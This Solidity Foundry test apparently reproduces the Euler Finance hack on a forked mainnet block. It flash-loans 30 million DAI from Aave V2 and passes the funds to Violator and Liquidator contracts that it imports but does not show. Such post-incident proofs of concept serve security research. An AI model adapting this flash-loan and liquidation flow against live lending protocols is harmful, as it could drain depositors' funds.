// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import {Liquidator} from "src/Liquidator.sol";
import {Violator} from "src/Violator.sol";
import {IAaveV2} from "src/interfaces/Aave.sol";
import {IEuler} from "src/interfaces/Euler.sol";
import {IERC20} from "src/interfaces/ERC20.sol";
import {IEToken} from "src/interfaces/EToken.sol";
import {IDToken} from "src/interfaces/DToken.sol";

/// @title Euler POC.
/// @author Enrique Ortiz <hi@enriqueortiz.dev> @Evalir
/// @notice Euler hack PoC, based on example transaction:
/// 0xc310a0affe2169d1f6feec1c63dbc7f7c62a887fa48795d327d4d2da2d6b111d
contract EulerPoc is Test {
    /*//////////////////////////////////////////////////////////////
                              CONSTANTS
    //////////////////////////////////////////////////////////////*/

    /// @dev The block number of the preceding attack block.
    /// Attack occurred at block 16817996. We're trying to be as accurate
    /// as possible in this POC.
    uint256 constant PRECEDING_ATTACK_BLOCK = 16817995;
    address constant EULER_PROTOCOL = 0x27182842E098f60e3D576794A5bFFb0777E025d3;
    address constant ATTACKER = 0x5F259D0b76665c337c6104145894F4D1D2758B8c;

    IERC20 DAI = IERC20(0x6B175474E89094C44Da98b954EedeAC495271d0F);
    IEToken eDAI = IEToken(0xe025E3ca2bE02316033184551D4d3Aa22024D9DC);
    IDToken dDAI = IDToken(0x6085Bc95F506c326DCBCD7A6dd6c79FBc18d4686);
    IEuler EulerLiquidationEngine = IEuler(0xf43ce1d09050BAfd6980dD43Cde2aB9F18C85b34);
    IAaveV2 AaveV2 = IAaveV2(0x7d2768dE32b0b80b7a3454c06BdAc94A69DDc7A9);

    /*//////////////////////////////////////////////////////////////
                               STORAGE
    //////////////////////////////////////////////////////////////*/

    Liquidator public liquidator;
    Violator public violator;

    function setUp() public {
        vm.createSelectFork("mainnet", PRECEDING_ATTACK_BLOCK);
        vm.label(address(DAI), "DAI");
        vm.label(address(eDAI), "eDAI");
        vm.label(address(dDAI), "dDAI");
        vm.label(address(EulerLiquidationEngine), "EulerLiquidationEngine");
        vm.label(address(AaveV2), "AaveV2");
    }

    function test_exploit() public {
        // Flashloan 30M DAI from AaveV2. Note that the attacker is using Aave's flashLoan() func,
        // even though he's not borrowing many assets. He could've used flashLoanSimple().
        // 1. Prepare the call data for the flashLoan() function.
        uint256 flashLoanAmount = 30_000_000e18;
        address[] memory asset = new address[](1);
        asset[0] = address(DAI);
        uint256[] memory amount = new uint256[](1);
        amount[0] = flashLoanAmount;
        uint256[] memory mode = new uint[](1);
        mode[0] = 0;
        // These params will be passed to the `executeOperation()` function.
        bytes memory params =
            abi.encode(30_000_000, 200_000_000, 100_000_000, 44_000_000, address(DAI), address(eDAI), address(dDAI));
        // 2. Kick off the exploit, by flashloaning the 30M DAI from Aave.
        // Execution continues in the executeOperation function.
        AaveV2.flashLoan(address(this), asset, amount, mode, address(this), params, 0);
    }

    function executeOperation(
        address[] calldata assets,
        uint256[] calldata amounts,
        uint256[] calldata premiums,
        address initator,
        bytes calldata params
    ) external returns (bool) {
        DAI.approve(address(AaveV2), type(uint256).max);
        console.log("Attacker balance:", DAI.balanceOf(address(this)));
        liquidator = new Liquidator();
        violator = new Violator();
        DAI.transfer(address(violator), DAI.balanceOf(address(this)));
        violator.violate();
        liquidator.liquidate(address(liquidator), address(violator));
        return true;
    }
}
